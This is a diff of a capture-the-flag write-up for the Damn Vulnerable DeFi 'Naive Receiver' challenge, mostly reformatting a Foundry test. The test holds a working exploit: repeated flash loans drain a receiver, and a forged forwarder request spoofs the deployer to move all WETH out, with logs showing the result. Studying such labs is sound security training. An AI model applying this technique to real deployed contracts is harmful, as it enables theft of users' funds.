@@ -167,10 +167,10 @@ Explanation:
 // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
 pragma solidity =0.8.25;
 
-import { Test, console } from "forge-std/Test.sol";
-import { NaiveReceiverPool, Multicall, WETH } from "../../src/naive-receiver/NaiveReceiverPool.sol";
-import { FlashLoanReceiver } from "../../src/naive-receiver/FlashLoanReceiver.sol";
-import { BasicForwarder } from "../../src/naive-receiver/BasicForwarder.sol";
+import {Test, console} from "forge-std/Test.sol";
+import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
+import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
+import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
 
 contract NaiveReceiverChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -207,11 +207,11 @@ contract NaiveReceiverChallenge is Test {
         forwarder = new BasicForwarder();
 
         // Deploy pool and fund with ETH
-        pool = new NaiveReceiverPool{ value: WETH_IN_POOL }(address(forwarder), payable(weth), deployer);
+        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);
 
         // Deploy flashloan receiver contract and fund it with some initial WETH
         receiver = new FlashLoanReceiver(address(pool));
-        weth.deposit{ value: WETH_IN_RECEIVER }();
+        weth.deposit{value: WETH_IN_RECEIVER}();
         weth.transfer(address(receiver), WETH_IN_RECEIVER);
 
         vm.stopPrank();
@@ -243,13 +243,15 @@ contract NaiveReceiverChallenge is Test {
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
         emit log("-------------------------- Before exploit --------------------------");
-        emit log_named_decimal_uint("WETH balance in the receiver contract", weth.balanceOf(address(receiver)), weth.decimals());
+        emit log_named_decimal_uint("WETH balance in the receiver", weth.balanceOf(address(receiver)), weth.decimals());
         emit log_named_decimal_uint("WETH balance in the pool contract", weth.balanceOf(address(pool)), weth.decimals());
-        emit log_named_decimal_uint("WETH balance in the recovery contract", weth.balanceOf(address(recovery)), weth.decimals());
+        emit log_named_decimal_uint("WETH balance in the recovery", weth.balanceOf(address(recovery)), weth.decimals());
 
         // Executing flashloan without the user's consent
         // This will exhaust all WETH in the receiver contract.
-        for (uint256 i; i < 10; ++i) pool.flashLoan(receiver, address(weth), 1 ether, hex"");
+        for (uint256 i; i < 10; ++i) {
+            pool.flashLoan(receiver, address(weth), 1 ether, hex"");
+        }
 
         // spoof as the deployer to withdraw all WETH tokens to the player
         // craft a calldata to bypass _msgSender and achieve arbitrary address spoofing
@@ -273,7 +275,8 @@ contract NaiveReceiverChallenge is Test {
             deadline: block.timestamp
         });
 
-        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));
+        bytes32 digest =
+            keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), forwarder.getDataHash(request)));
         (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
         bytes memory signature = abi.encodePacked(r, s, v);
 
@@ -284,9 +287,9 @@ contract NaiveReceiverChallenge is Test {
         weth.transfer(recovery, 1010 ether);
 
         emit log("-------------------------- After exploit --------------------------");
-        emit log_named_decimal_uint("WETH balance in the receiver contract", weth.balanceOf(address(receiver)), weth.decimals());
+        emit log_named_decimal_uint("WETH balance in the receiver", weth.balanceOf(address(receiver)), weth.decimals());
         emit log_named_decimal_uint("WETH balance in the pool contract", weth.balanceOf(address(pool)), weth.decimals());
-        emit log_named_decimal_uint("WETH balance in the recovery contract", weth.balanceOf(address(recovery)), weth.decimals());
+        emit log_named_decimal_uint("WETH balance in the recovery", weth.balanceOf(address(recovery)), weth.decimals());
     }
 
     /**
@@ -313,19 +316,20 @@ contract NaiveReceiverChallenge is Test {
 ```
 Ran 2 tests for test/naive-receiver/NaiveReceiver.t.sol:NaiveReceiverChallenge
 [PASS] test_assertInitialState() (gas: 34878)
-[PASS] test_naiveReceiver() (gas: 431355)
+[PASS] test_naiveReceiver() (gas: 432056)
 Logs:
-  WETH balance in the receiver contract: 10.000000000000000000
+  -------------------------- Before exploit --------------------------
+  WETH balance in the receiver: 10.000000000000000000
   WETH balance in the pool contract: 1000.000000000000000000
-  WETH balance in the recovery contract: 0.000000000000000000
+  WETH balance in the recovery: 0.000000000000000000
   -------------------------- After exploit --------------------------
-  WETH balance in the receiver contract: 0.000000000000000000
+  WETH balance in the receiver: 0.000000000000000000
   WETH balance in the pool contract: 0.000000000000000000
-  WETH balance in the recovery contract: 1010.000000000000000000
+  WETH balance in the recovery: 1010.000000000000000000
 
-Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 7.35ms (1.77ms CPU time)
+Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 8.54ms (2.26ms CPU time)
 
-Ran 1 test suite in 260.81ms (7.35ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
+Ran 1 test suite in 261.32ms (8.54ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
 ```
 
 ## References
